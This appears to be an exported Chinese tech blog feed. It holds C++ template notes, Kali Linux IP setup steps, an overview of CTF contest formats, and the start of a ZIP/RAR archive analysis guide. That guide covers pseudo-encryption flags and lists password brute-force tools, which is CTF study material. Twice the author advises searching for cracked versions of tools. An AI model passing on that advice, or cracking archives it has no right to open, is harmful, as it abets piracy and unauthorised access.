<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>, <span class="keyword">class</span> <span class="title class_">AgeType</span> = <span class="type">int</span>&gt; </span><br><span class="line"><span class="keyword">class</span> Person</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(NameType name, AgeType age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mName = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;name: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mName &lt;&lt; <span class="string">&quot; age: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	NameType mName;</span><br><span class="line">	AgeType mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Person <span class="title">p</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">1000</span>)</span></span>; <span class="comment">// 错误 类模板使用时候，不可以用自动类型推导</span></span><br><span class="line">Person &lt;string ,<span class="type">int</span>&gt;<span class="built_in">p</span>(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">1000</span>); <span class="comment">//必须使用显示指定类型的方式，使用类模板</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>类模板在模板参数列表中可以有默认参数</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>, <span class="keyword">class</span> <span class="title class_">AgeType</span> = <span class="type">int</span>&gt;</span><br><span class="line">    </span><br><span class="line">Person &lt;string&gt; <span class="built_in">p</span>(<span class="string">&quot;猪八戒&quot;</span>, <span class="number">999</span>); <span class="comment">//类模板中的模板参数列表 可以指定默认参数</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="1-3-7-类模板分文件编写"><a href="#1-3-7-类模板分文件编写" class="headerlink" title="1.3.7 类模板分文件编写"></a>1.3.7 类模板分文件编写</h4><p><strong>可用于类外实现的情况</strong></p>
<p> <strong>方法：</strong></p>
<ul>
<li>直接包含.cpp源文件</li>
<li>将声明.h和实现.cpp写到同一个文件中，并更改后缀名为<code>.hpp</code>，<code>.hpp</code>是约定的名称，并不是强制（主流）</li>
</ul>
<p><strong>提示：</strong></p>
<ul>
<li>在.h源文件中，<code>#pragma once</code>防止头文件重复包含</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%8F%90%E9%AB%98%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241028022728934.png"
                      alt="image-20241028022728934"
                ></p>
<h4 id="1-3-8-类模板与友元"><a href="#1-3-8-类模板与友元" class="headerlink" title="1.3.8 类模板与友元"></a>1.3.8 类模板与友元</h4><p><strong>实现方法：</strong></p>
<ul>
<li><p>全局函数<strong>类内实现</strong> - 直接在类内声明友元即可（建议用此）</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//1、全局函数配合友元   类内实现</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">printPerson</span><span class="params">(Person&lt;T1, T2&gt; &amp; p)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; p.m_Age &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(T1 name, T2 age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T1 m_Name;</span><br><span class="line">	T2 m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">20</span>);</span><br><span class="line">	<span class="built_in">printPerson</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>全局函数<strong>类外实现</strong> - 需要提前让编译器知道全局函数的存在（将在类外实现的函数提前写，还要提前写明类与模板）</p>
<ol>
<li><p>全局函数提前</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T1,<span class="keyword">class</span> T2&gt;</span></span><br><span class="line"><span class="function"><span class="title">printPerson2</span><span class="params">(Person&lt;T1,T2&gt;p)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;类外实现 ---- 姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; p.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>类模板提前</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>类声明提前</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>;</span><br><span class="line"><span class="comment">//函数模板的实现</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T1,<span class="keyword">class</span> T2&gt;</span></span><br><span class="line"><span class="function"><span class="title">printPerson2</span><span class="params">(Person&lt;T1,T2&gt;p)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;类外实现 ---- 姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; p.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以上为提前告诉编译器的东西</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//2、全局函数配合友元  类外实现</span></span><br><span class="line">    <span class="comment">//普通函数的声明</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">printPerson2</span><span class="params">(Person&lt;T1, T2&gt; &amp; p)</span></span>;</span><br><span class="line">    <span class="comment">//函数模板的声明</span></span><br><span class="line">	<span class="keyword">friend</span> <span class="type">void</span> printPerson2&lt;&gt;(Person&lt;T1, T2&gt; &amp; p);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(T1 name, T2 age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T1 m_Name;</span><br><span class="line">	T2 m_Age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;Jerry&quot;</span>, <span class="number">30</span>);</span><br><span class="line">	<span class="built_in">printPerson2</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="具体提高部分引入"><a href="#具体提高部分引入" class="headerlink" title="具体提高部分引入"></a>具体提高部分引入</h2><p>这里是<strong>黑马程序员</strong>的免费资料，本人从网盘中下载下来了，要学习完整C++基础资料的可以访问下面链接，链接为我的博客（搬运过来了），里面也有C++基础资料的网盘分享</p>
<a href="/2024/10/26/C++/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/" title="C++&#x2F;C++提高编程">C++提高编程</a>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>data</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的IP配置</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/IP%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="kali的IP配置"><a href="#kali的IP配置" class="headerlink" title="kali的IP配置"></a>kali的IP配置</h1><h2 id="静态IP"><a href="#静态IP" class="headerlink" title="静态IP"></a>静态IP</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces //进入ip修改环境</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913223421712.png"
                      alt="image-20240913223421712"
                ></p>
<p>在这两行下面输入</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.111	//根据自身ip地址自定义</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1		//根据自身ip网关自定义</span><br><span class="line">//退出并保存（:wq）</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913223524009.png"
                      alt="image-20240913223524009"
                ></p>
<blockquote>
<p>说明</p>
</blockquote>
<p><strong>address表示自身要自定义的ip地址</strong><br><strong>netmask表示网关的子网掩码</strong><br><strong>gateway表示网关ip</strong></p>
<p>以上可以通过<code>ifconfig</code>查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913223931352.png"
                      alt="image-20240913223931352"
                ></p>
<p>下一步修改DNS解析，将默认的删掉改为如下设置</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/resolv.conf //修改DNS解析文件</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>119.29.29.29是腾讯的公共DNS</p>
<p>223.5.5.5是阿里的公共DNS</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913224115739.png"
                      alt="image-20240913224115739"
                ></p>
<p>配置完IP信息后，重启Kali的网络服务，让网络配置生效</p>
<p>重启网络服务之前需要关闭<code>NetworkManager</code>，并且禁止该服务开机自启</p>
<blockquote>
<p>注:关闭NetworkManager服务,该服务是网络服务的图形管理工具,该服务会自动接管networking服务,有可能造成重启networking服务时配置不生效的问题</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop NetworkManager</span><br><span class="line">systemctl <span class="built_in">disable</span> NetworkManager</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/68920a80a0c29dd26f032a02a72a1f3e.png"
                      alt="68920a80a0c29dd26f032a02a72a1f3e"
                ></p>
<p>再重启Kali网络服务</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure></div>

<p>查看IP配置是否成功</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig eth0</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913224341195.png"
                      alt="image-20240913224341195"
                ></p>
<blockquote>
<p>因为我本身就是静态Ip所以没有变化</p>
</blockquote>
<p>IP地址没有变化，如果是首次更改IP配置，然后重启网络服务，IP 地址没生效属于正常情况，再重启一次就行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure></div>

<h2 id="动态IP"><a href="#动态IP" class="headerlink" title="动态IP"></a>动态IP</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces #进入ip修改环境</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913223421712.png"
                      alt="image-20240913223421712"
                ></p>
<p>指定网卡并添加 <code>IP</code> 获取方式为 <code>DHCP</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/IP%E9%85%8D%E7%BD%AE/image-20240913224612463.png"
                      alt="image-20240913224612463"
                ></p>
<p>重启Kali网络服务</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure></div>

<p>查看IP配置是否成功</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig eth0</span><br></pre></td></tr></table></figure></div>

<p>IP地址没有变化，如果是首次更改IP配置，然后重启网络服务，IP 地址没生效属于正常情况，再重启一次就行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>操作系统</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF竞赛模式</title>
    <url>/2024/09/12/ctf/data/another/%E7%AB%9E%E8%B5%9B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="竞赛模式"><a href="#竞赛模式" class="headerlink" title="竞赛模式"></a>竞赛模式</h1><p>CTF竞赛模式具体分为以下几类：</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h3><p>理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p>
<h3 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h3><p>参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。</p>
<p>不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。</p>
<p>当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为<code>动态积分</code></p>
<p>题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p>
<h3 id="AwD-攻防模式"><a href="#AwD-攻防模式" class="headerlink" title="AwD-攻防模式"></a>AwD-攻防模式</h3><p><strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为<code>GameBox</code>，每个队伍之间的GameBox<code>配置及漏洞是完全一致</code>的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为<code>Checker</code>的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。</p>
<p>AwD通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p>
<h3 id="ADP-攻防增强"><a href="#ADP-攻防增强" class="headerlink" title="ADP-攻防增强"></a>ADP-攻防增强</h3><p><strong>A</strong>ttack <strong>D</strong>efense <strong>P</strong>lus(ADP)全称攻防增强模式，在该模式下中，参赛队伍连接到同一个网络空间。主办方会在平台上放置题目，选手需要登录到平台获得题目信息</p>
<p>攻击模式下，平台会给出题目的访问链接，选手按照解题模式做题提交flag即可完成攻击，当完成攻击后， 每轮计算分数时均会计算该题目的攻击得分。</p>
<p>防御模式下，选手需要自行挖掘题目的漏洞，并制作漏洞补丁包上传至平台，之后点击验证。验证时平台会新建一个完全干净的题目环境，使用预置的Exploit进行攻击，若攻击成功当验证通过之后（即已经完成修补），每轮计算分数均会认为该题目已防御。</p>
<p>也就是说，对于每个题目，仅需要攻击成功一次，防御成功一次，该题就可以认为已完成，后续无需进行关注。</p>
<p>ADP通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。随着比赛的进行，最早的题目可能会下线，后续也有可能会上线新的题目。</p>
<p>ADP相较于AwD来说，选手无须编写批量攻击脚本，也无需关注题目的环境是否被攻击，是否服务异常等等，要做的只是攻击一次，防御一次，选手可以有更多的时间聚焦于还未完成的题目。从主办方的角度来说，大大减轻了比赛的硬件成本和运维成本。</p>
<h3 id="RHG-自动化-AI自动化"><a href="#RHG-自动化-AI自动化" class="headerlink" title="RHG-自动化[AI自动化]"></a>RHG-自动化[AI自动化]</h3><p><strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于<code>漏洞理解</code>以及<code>工程化</code>能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为<code>bot</code>，在程序中<code>全自动</code>访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。</p>
<p>比赛过程中不允许选手对bot进行任何的操作(包括debug&#x2F;patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p>
<h3 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h3><p><strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年<code>长亭科技</code>主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM&#x2F;Docker逃逸、针对浏览器的攻击、针对IoT&#x2F;Car等设备的攻击，Web类攻击等等<br>在RW赛制中会有一个<code>Show Time</code>，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为<code>5分钟</code>，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如未在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率</p>
<p>举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码&#x2F;数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并<code>不存在Flag</code>。</p>
<h3 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h3><p><strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(<code>队伍名称</code>或是<code>Token</code>之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p>
<h3 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix[混合]"></a>Mix[混合]</h3><p>混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p>
<hr>
<p>搬迁自<a class="link"   href="https://www.wolai.com/ctfhub/mmJYyc569kAXHvfam4qont" >CTF官方指导 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>another</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向分析基础</title>
    <url>/2024/09/26/ctf/data/reverse/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="逆向分析基础"><a href="#逆向分析基础" class="headerlink" title="逆向分析基础"></a>逆向分析基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2>
  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>提供的工具若未破解或链接已挂，请自行搜索破解版使用</p>

  </div>

]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩包分析</title>
    <url>/2024/09/23/ctf/data/misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="压缩包分析"><a href="#压缩包分析" class="headerlink" title="压缩包分析"></a>压缩包分析</h1><p>根据压缩包文件的内容和结构存在着多种破解方式，如暴力破解，字典攻击与明文攻击等方法</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里会提供一些来自buuctf的案例，但这章比较简单，题目就自行前往靶场去试试吧，就不再写WP了</p>
<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2>
  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>提供的工具若未破解或链接已挂，请自行搜索破解版使用</p>

  </div>

<p><a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 16进制编辑器</p>
<p><a class="link"   href="https://www.gndown.com/4185.html" >ARCHPR <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 多种压缩格式密码爆破</p>
<p><a class="link"   href="https://www.52pojie.cn/thread-1511025-1-1.html" >Ziperello <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ZIP格式的密码爆破</p>
<p><a class="link"   href="https://github.com/AabyssZG/CRC32-Tools" >CRC32-Tools <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> CRC32碰撞脚本工具</p>
<h2 id="常见压缩包格式"><a href="#常见压缩包格式" class="headerlink" title="常见压缩包格式"></a>常见压缩包格式</h2>
  <div class="note p-4 mb-4 rounded-small info">
    <p>ZIP文件格式与RAR文件格式，是比较常见的压缩包格式</p>

  </div>

<h3 id="ZIP文件格式"><a href="#ZIP文件格式" class="headerlink" title="ZIP文件格式"></a>ZIP文件格式</h3><p>ZIP文件一般包含：压缩源文件数据区、压缩源文件目录区、压缩源文件目录结束标志。</p>
<p>需要记住的压缩源文件数据区的文件字节和压缩源文件目录区的文件字节如下</p>
<p><strong>压缩源文件数据区含义及其字节</strong></p>
<table>
<thead>
<tr>
<th>含义</th>
<th>字节数</th>
</tr>
</thead>
<tbody><tr>
<td>文件头标记</td>
<td>4bytes（504b<strong>0304</strong>）</td>
</tr>
<tr>
<td>解压文件所需版本</td>
<td>2bytes</td>
</tr>
<tr>
<td>通用位标记</td>
<td>2bytes</td>
</tr>
<tr>
<td>压缩方式</td>
<td>2bytes</td>
</tr>
<tr>
<td>最后修改文件时间</td>
<td>2bytes</td>
</tr>
<tr>
<td>最后修改文件日期</td>
<td>2bytes</td>
</tr>
<tr>
<td>CRC-32</td>
<td>4bytes</td>
</tr>
</tbody></table>
<p><strong>压缩源文件目录区含义及其字节</strong></p>
<table>
<thead>
<tr>
<th>含义</th>
<th>字节数</th>
</tr>
</thead>
<tbody><tr>
<td>文件头标记</td>
<td>4bytes（504b<strong>0102</strong>）</td>
</tr>
<tr>
<td>压缩使用的版本</td>
<td>2bytes</td>
</tr>
<tr>
<td>解压文件所需版本</td>
<td>2bytes</td>
</tr>
<tr>
<td>通用位标记</td>
<td>2bytes</td>
</tr>
<tr>
<td>压缩方式</td>
<td>2bytes</td>
</tr>
<tr>
<td>最后修改文件时间</td>
<td>2bytes</td>
</tr>
<tr>
<td>最后修改文件日期</td>
<td>2bytes</td>
</tr>
<tr>
<td>CRC-32</td>
<td>4bytes</td>
</tr>
</tbody></table>
<h3 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h3><p>RAR可以兼容ZIP，能够压缩或解压缩ZIP文件，但是ZIP无法完成对RAR文件的解压缩，且<strong>RAR当压缩包破损但恢复记录足够多时，可以对损坏的压缩包进行恢复</strong></p>
<h2 id="常见压缩包破解方法"><a href="#常见压缩包破解方法" class="headerlink" title="常见压缩包破解方法"></a>常见压缩包破解方法</h2><h3 id="伪加密破解"><a href="#伪加密破解" class="headerlink" title="伪加密破解"></a>伪加密破解</h3>
  <div class="note p-4 mb-4 rounded-small info">
    <p>一般指ZIP伪加密</p>

  </div>

<p>加密手段分为：未加密、真加密和伪加密</p>
<p>未加密，即<strong>压缩源文件数据区的通用位标记</strong>为<code>0000</code>，<strong>压缩源文件目录区的通用位标记</strong>也为<code>0000</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/image-20240923000331714.png"
                      alt="image-20240923000331714"
                ></p>
<p>伪加密，即<strong>压缩源文件数据区的通用位标记</strong>为任意值，<strong>压缩源文件目录区的通用位标记</strong>为<code>0900</code>或<code>0100</code>这种奇数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
